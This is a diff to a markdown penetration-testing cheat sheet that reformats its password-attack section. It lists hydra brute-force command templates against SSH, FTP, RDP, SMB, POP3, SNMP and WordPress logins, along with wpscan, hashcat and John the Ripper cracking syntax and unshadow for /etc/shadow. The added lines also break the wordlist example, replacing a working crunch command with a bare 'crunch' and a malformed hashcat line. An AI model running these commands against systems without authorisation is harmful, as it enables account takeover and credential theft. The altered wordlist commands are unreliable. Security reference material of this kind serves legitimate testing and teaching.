@@ -245,70 +245,76 @@ Below are a few scriptable examples of common protocols to brute force logins.
 
 | Command | Description |
 | :--- | :--- |
-| hydra -P $pass\_list -v $ip snmp -v | Brute force against SNMP |
-| hydra -t 1 -l $user -P $pass\_list -v $ip ftp | FTP with  known user using password list |
-| hydra -v -V -u -L $users\_list -P $pass\_list -t 1 -u $ip ssh | SSH using list of users and passwords |
-| hydra -v -V -u -L $users\_list -p $pass -t 1 -u $ip ssh | SSH with a known password and a username list |
-| hydra $ip -s $port ssh -l $user -P $pass\_list | SSH with known username on non-standard port |
-| hydra -l $user -P $pass\_list -f $ip pop3 -v | POP3 Brute Force |
-| hydra -L $users\_list -P $pass\_list $ip http-get $login\_page | HTTP GET with user and pass list |
-| hydra -t 1 -v -f -l $user -P $pass\_list rdp://$ip | Windows Remote Desktop with pass list |
-| hydra -t 1 -V -f -l $user -P $pass\_list $ip smb | SMB brute force with known user and pass list |
-| hydra -l $user -P $pass\_list $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | WordPress brute force an admin login |
-| hydra -v -L $users\_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' | WordPress enumerate users |
-| wpscan --url $url -U $user -P $pass\_list | Use wpscan to brute force password with known user |
+| `hydra -P $pass_list -v $ip snmp -v` | Brute force against SNMP |
+| `hydra -t 1 -l $user -P $pass_list -v $ip ftp` | FTP with  known user using password list |
+| `hydra -v -V -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH using list of users and passwords |
+| `hydra -v -V -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH with a known password and a username list |
+| `hydra $ip -s $port ssh -l $user -P $pass_list` | SSH with known username on non-standard port |
+| `hydra -l $user -P $pass_list -f $ip pop3 -v` | POP3 Brute Force |
+| `hydra -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET with user and pass list |
+| `hydra -t 1 -v -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop with pass list |
+| `hydra -t 1 -V -f -l $user -P $pass_list $ip smb` | SMB brute force with known user and pass list |
+| `hydra -l $user -P $pass_list $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress brute force an admin login |
+| `hydra -v -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress enumerate users |
+| `wpscan --url $url -U $user -P $pass_list` | Use wpscan to brute force password with known user |
 
 ## Password Hashes
 
 ### Identifying Hashes
 
-* MD5 = 32 hex characters.
-* SHA-1 = 40 hex characters.
-* SHA-256 = 64 hex characters.
-* SHA-512 = 128 hex characters.
+```bash
+MD5 = 32 hex characters
+SHA-1 = 40 hex characters
+SHA-256 = 64 hex characters
+SHA-512 = 128 hex characters
+```
 
+Find the type of hash:
 
-
-* Find the type of hash:
-
-  ```text
-  hash-identifier
-  ```
+```text
+hash-identifier
+```
 
 * Find hash type at [https://hashkiller.co.uk](https://hashkiller.co.uk)
-* Running `john` with no parameters will attempt to tell you the hash type:
 
-  ```text
-  john $hash_list
-  ```
+Running `john` with no parameters will attempt to tell you the hash type:
+
+```text
+john $hash_list
+```
 
 ### Hash Cracking
 
-* Hashcat basic syntax:
+#### Hashcat basic syntax:
 
-  ```text
-  hashcat -m $hash_type -a $mode -o $out_file $hash_file $pass_list
-  ```
+```text
+hashcat -m $hash_type -a $mode -o $out_file $hash_file $pass_list
+```
 
-* John the Ripper basic syntax:
+#### John the Ripper basic syntax:
 
-  ```text
-  john --wordlist=$pass_list --format $hash_format $hash_list
-  ```
+```text
+john --wordlist=$pass_list --format $hash_format $hash_list
+```
 
-* Convert hashes from `/etc/shadow`to a crackable format \(then use john to crack\):
+#### Convert hashes from `/etc/shadow`to a crackable format \(then use john to crack\):
 
-  ```text
-  unshadow $etc_password $etc_shadow > $unshadowed_outfile
-  ```
+```text
+unshadow $etc_password $etc_shadow > $unshadowed_outfile
+```
 
-* Generating wordlists
+#### Generating wordlists
 
-  ```text
-  crunch 6 6 0123456789ABCDEF 5o crunch1.txt
-  ```
+```text
+crunch
 
-Online rainbow tables:
+#hashcat can make a huge variety of different passwords using many 
+#different mangling rules or masks
+
+hashcat --outfile > $hash_file 
+```
+
+#### Online rainbow tables:
 
 * https://crackstation.net/
 * http://www.cmd5.org/
